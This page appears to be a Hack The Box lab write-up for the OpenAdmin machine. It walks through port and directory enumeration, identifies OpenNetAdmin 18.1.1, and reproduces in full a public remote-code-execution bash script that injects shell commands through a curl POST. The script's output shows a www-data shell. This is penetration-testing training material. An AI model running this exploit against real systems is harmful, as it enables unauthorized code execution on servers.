@@ -1,0 +1,657 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="To those who are bold enough to knock!">
+    <meta name="author" content="Sabe Barker">
+
+    <title>OpenAdmin - Hack The Box · Sabe Barker</title>
+
+    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/openadmin/">
+
+    <!-- Bootstrap core CSS -->
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+	<!-- Custom CSS -->
+    <link href="/assets/css/sabe.css" rel="stylesheet">
+    <!-- Lightbox -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
+    <!-- Favicons -->
+	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
+	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+	<link rel="manifest" href="/assets/img/favicons/manifest.json">
+	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
+	<link rel="icon" href="/assets/img/favicons/favicon.ico">
+	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
+	<meta name="application-name" content="Sabe Barker">
+	<meta name="msapplication-TileColor" content="#fff">
+	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+	<meta name="theme-color" content="#fff">
+	
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@sabebarker">
+    <meta name="twitter:creator" content="@sabebarker">
+    <meta name="twitter:title" content="OpenAdmin - Hack The Box · Sabe Barker">
+    <meta name="twitter:description" content="To those who are bold enough to knock!">
+    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/openadmin/openadmin_infocard.png">
+
+    <!-- Facebook -->
+    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/openadmin/" />
+    <meta property="og:title" content="OpenAdmin - Hack The Box · Sabe Barker">
+    <meta property="og:description" content="To those who are bold enough to knock!">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/openadmin/openadmin_infocard.png">
+    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/openadmin/openadmin_infocard.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
+	<script>
+  		window.dataLayer = window.dataLayer || [];
+  		function gtag(){dataLayer.push(arguments);}
+  		gtag('js', new Date());
+
+  		gtag('config', 'UA-151243373-1');
+	</script>
+  </head>
+  <body>
+    <a class="skippy sr-only sr-only-focusable" href="#content">
+      <span class="skippy-text">Skip to main content</span>
+    </a>
+
+    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
+      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewbox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><lineargradient id="SVGID_1_" gradientunits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"></stop><stop offset="1" stop-color="#0bb1d3"></stop></lineargradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"></path></svg>{ sabebarker }
+      </a>
+
+      <div class="navbar-nav-scroll">
+        <ul class="navbar-nav sb-navbar-nav flex-row">
+          <li class="nav-item">
+            <a class="nav-link " href="/search">
+        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewbox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
+      </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/">
+	      Home
+	     </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/blog">
+	      Blog
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link active" href="/writeups">
+	      Writeups
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/tools">
+	      Tools
+	    </a>
+          </li>
+        </ul>
+      </div>
+
+      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
+        <li class="nav-item">
+          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title>
+<path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"></path></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title>
+<path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"></path></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 24 24" role="img" focusable="false"><title>Facebook</title>
+<path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"></path><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"></path></svg></a>
+       </li>
+      </ul>
+    </header>
+
+
+    <div class="container-fluid">
+      <div class="row flex-xl-nowrap">
+        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
+          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewbox="0 0 30 30" role="img" focusable="false"><title>Menu</title>
+<path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button>
+
+<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
+      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
+        Getting Started
+      </a>
+
+      <ul class="nav sb-sidenav">
+<li>
+            <a href="/writeups/hackthebox/getting-started/introduction/">
+              Introduction
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/getting-started/basic-setup/">
+              Basic Setup
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
+              VPN Setup
+            </a>
+          </li>
+</ul>
+    </div>
+<div class="sb-toc-item active">
+      <a class="sb-toc-link" href="/writeups/hackthebox/machines/nest/">
+        Machines
+      </a>
+
+      <ul class="nav sb-sidenav">
+<li>
+            <a href="/writeups/hackthebox/machines/nest/">
+              Nest
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/resolute/">
+              Resolute
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/obscurity/">
+              Obscurity
+            </a>
+          </li>
+<li class="active sb-sidenav-active">
+            <a href="/writeups/hackthebox/machines/openadmin/">
+              OpenAdmin
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/mango/">
+              Mango
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/traverxec/">
+              Traverxec
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/forest/">
+              Forest
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/postman/">
+              Postman
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/scavenger/">
+              Scavenger
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/json/">
+              Json
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/ai/">
+              AI
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/bitlab/">
+              Bitlab
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/craft/">
+              Craft
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/networked/">
+              Networked
+            </a>
+          </li>
+</ul>
+    </div></nav>
+        </div>
+
+        
+          <div class="d-none d-xl-block col-xl-2 sb-toc">
+            <ul class="section-nav">
+<li class="toc-entry toc-h2">
+<a href="#enumeration">Enumeration</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
+<li class="toc-entry toc-h3">
+<a href="#directory-bruteforce">Directory Bruteforce</a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#arcwork">Arcwork</a></li>
+<li class="toc-entry toc-h4"><a href="#sierra">Sierra</a></li>
+<li class="toc-entry toc-h4"><a href="#solmusic">SolMusic</a></li>
+<li class="toc-entry toc-h4"><a href="#opennetadmin">OpenNetAdmin</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#foothold">Foothold</a></li>
+<li class="toc-entry toc-h2">
+<a href="#user">User</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#path-1---ssh-key">Path 1 - SSH Key</a></li>
+<li class="toc-entry toc-h3"><a href="#path-2---alter-script">Path 2 - Alter Script</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
+<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
+</ul>
+          </div>
+        
+
+        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
+          <h1 class="sb-title" id="content">OpenAdmin</h1>
+          <p class="sb-lead">To those who are bold enough to knock!</p>
+          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/openadmin/openadmin_infocard.png" alt="HackTheBox OpenAdmin Machine Info Card" class="img-fluid"></p>
+
+<p><strong>OpenAdmin</strong> is an easy difficulty machine running Linux. It tests your knowledge in <em>OSINT, exploitation through a publicly known exploit and basic privilege escalation using a GTFOBin</em>.</p>
+
+<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>
+
+<h3 id="portscan">Portscan</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan openadmin.htb 
+Grabbing ports...
+Ports grabbed!
+Scanning...
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-01-04 22:52 PST
+Nmap scan report <span class="k">for </span>openadmin.htb <span class="o">(</span>10.10.10.171<span class="o">)</span>
+Host is up <span class="o">(</span>0.23s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.73 seconds</code></pre></figure>
+
+<p>We have two open ports. <code class="highlighter-rouge">SSH</code> on port <code class="highlighter-rouge">22</code> and <code class="highlighter-rouge">Apache</code> on port <code class="highlighter-rouge">80</code> which we can see goes to the deault ubuntu <code class="highlighter-rouge">It Works</code> page.</p>
+
+<h3 id="directory-bruteforce">Directory Bruteforce</h3>
+
+<p>Since that page seems like a dead end let’s check for any other directories that may be available:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://openadmin.htb <span class="nt">-t</span> 10 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-o</span> gobuster_dir.txt
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://openadmin.htb
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/01/04 22:23:56 Starting gobuster
+<span class="o">===============================================================</span>
+/artwork <span class="o">(</span>Status: 301<span class="o">)</span>
+/music <span class="o">(</span>Status: 301<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+/sierra <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/01/04 22:25:01 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>Let’s take a look at each of the directories we have found.</p>
+
+<h4 id="arcwork">Arcwork</h4>
+
+<p>We have <code class="highlighter-rouge">http://openadmin.htb/artwork/</code> which is a business website for <code class="highlighter-rouge">Arcwork</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/openadmin/openadmin.htb_arcwork.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/openadmin/openadmin.htb_arcwork.png" alt="Arcwork Screenshot" class="img-fluid"></a></p>
+
+<p>Nothing seems to stand out at first glance and a quick view of the source reveals nothing interesting.</p>
+
+<h4 id="sierra">Sierra</h4>
+
+<p>Navigating to <code class="highlighter-rouge">http://openadmin.htb/sierra/</code> we see another business site called <code class="highlighter-rouge">Sierra</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/openadmin/openadmin.htb_sierra.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/openadmin/openadmin.htb_sierra.png" alt="Sierra Screenshot" class="img-fluid"></a></p>
+
+<p>I am starting to think there is a theme here. Web hosting or design company?</p>
+
+<p><em>Sierra</em> also doesn’t show anything interesting on the site or within the source.</p>
+
+<h4 id="solmusic">SolMusic</h4>
+
+<p>Taking a look at <code class="highlighter-rouge">http://openadmin.htb/music/</code> we have another business site called <code class="highlighter-rouge">SolMusic</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/openadmin/openadmin.htb_solmusic.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/openadmin/openadmin.htb_solmusic.png" alt="SolMusic Screenshot" class="img-fluid"></a></p>
+
+<p>The first thing that catches our eye in comparison to the other sites is that this site has a <code class="highlighter-rouge">Login</code> link in the navbar.</p>
+
+<h4 id="opennetadmin">OpenNetAdmin</h4>
+
+<p>The link takes us to <code class="highlighter-rouge">http://openadmin.htb/ona/</code> where we come across this page:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/openadmin/openadmin.htb_ona.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/openadmin/openadmin.htb_ona.png" alt="OpenNetAdmin Screenshot" class="img-fluid"></a></p>
+
+<p>Something that is interesting is the <code class="highlighter-rouge">Newer Version Available</code> alert that lists the version <code class="highlighter-rouge">v18.1.1</code>. Although there is no direct mention of what the web application is there is also a link to ` DOWNLOAD the latest version`.</p>
+
+<p>The download link takes us to <code class="highlighter-rouge">http://opennetadmin.com/download.html</code> which is web application that keeps a <code class="highlighter-rouge">database managed inventory of your IP network</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/openadmin/opennetadmin.com_download.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/openadmin/opennetadmin.com_download.png" alt="ONA Download Screenshot" class="img-fluid"></a></p>
+
+<p>Looks like we have found our <code class="highlighter-rouge">openadmin</code> reference and most likely our way in!</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>Let’s checkout <code class="highlighter-rouge">OpenNetAdmin</code> and see if there are any vulnerabilities available for that version:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">searchsploit opennetadmin 18.1.1
+<span class="nt">-----------------------------------------------------------------------------------------</span>
+ Exploit Title                                      |  Path
+                                                    | <span class="o">(</span>/usr/share/exploitdb/<span class="o">)</span>
+<span class="nt">-----------------------------------------------------------------------------------------</span>
+OpenNetAdmin 18.1.1 - Remote Code Execution         | exploits/php/webapps/47691.sh
+<span class="nt">-----------------------------------------------------------------------------------------</span>
+Shellcodes: No Result
+Papers: No Result</code></pre></figure>
+
+<p>We find one RCE exploit. Let’s check it out and see what we have got:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">searchsploit <span class="nt">-x</span> exploits/php/webapps/47691.sh
+<span class="c"># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span>
+<span class="c"># Date: 2019-11-19</span>
+<span class="c"># Exploit Author: mattpascoe</span>
+<span class="c"># Vendor Homepage: http://opennetadmin.com/</span>
+<span class="c"># Software Link: https://github.com/opennetadmin/ona</span>
+<span class="c"># Version: v18.1.1</span>
+<span class="c"># Tested on: Linux</span>
+
+<span class="c"># Exploit Title: OpenNetAdmin v18.1.1 RCE</span>
+<span class="c"># Date: 2019-11-19</span>
+<span class="c"># Exploit Author: mattpascoe</span>
+<span class="c"># Vendor Homepage: http://opennetadmin.com/</span>
+<span class="c"># Software Link: https://github.com/opennetadmin/ona</span>
+<span class="c"># Version: v18.1.1</span>
+<span class="c"># Tested on: Linux</span>
+
+<span class="c">#!/bin/bash</span>
+
+<span class="nv">URL</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">1</span><span class="k">}</span><span class="s2">"</span>
+<span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do
+ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$ </span><span class="s2">"</span><span class="p">;</span> <span class="nb">read </span>cmd
+ curl <span class="nt">--silent</span> <span class="nt">-d</span> <span class="s2">"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo </span><span class="se">\"</span><span class="s2">BEGIN</span><span class="se">\"</span><span class="s2">;</span><span class="k">${</span><span class="nv">cmd</span><span class="k">}</span><span class="s2">;echo </span><span class="se">\"</span><span class="s2">END</span><span class="se">\"</span><span class="s2">&amp;xajaxargs[]=ping"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">URL</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'/BEGIN/,/END/ p'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +2 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-1</span>
+<span class="k">done</span></code></pre></figure>
+
+<p>Pretty straight forward. The script takes a <code class="highlighter-rouge">url</code> as an argument and then using <code class="highlighter-rouge">curl</code> with the <code class="highlighter-rouge">-d</code> option that sends <code class="highlighter-rouge">HTTP POST data</code>. That data is the injection and execution of arbitrary PHP code namingly <em>Ping Command Injection</em>.</p>
+
+<p>Lets go ahead and copy the contents to a file called <code class="highlighter-rouge">exploit.sh</code> and see if we can get a shell:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c">#!/bin/bash</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">1</span><span class="k">}</span><span class="s2">"</span>
+<span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do
+ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$ </span><span class="s2">"</span><span class="p">;</span> <span class="nb">read </span>cmd
+ curl <span class="nt">--silent</span> <span class="nt">-d</span> <span class="s2">"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo </span><span class="se">\"</span><span class="s2">BEGIN</span><span class="se">\"</span><span class="s2">;</span><span class="k">${</span><span class="nv">cmd</span><span class="k">}</span><span class="s2">;echo </span><span class="se">\"</span><span class="s2">END</span><span class="se">\"</span><span class="s2">&amp;xajaxargs[]=ping"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">URL</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'/BEGIN/,/END/ p'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +2 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-1</span>
+ <span class="k">done</span></code></pre></figure>
+
+<p>And make the script executable:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">chmod</span> +x exploit.sh</code></pre></figure>
+
+<p>Now all that’s left is to give it a run:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./exploit.sh http://openadmin.htb/ona/
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span></code></pre></figure>
+
+<p>We gain a shell and have access as the <code class="highlighter-rouge">www-data</code> user of which will most likely have limited access. We will need to move to another user.</p>
+
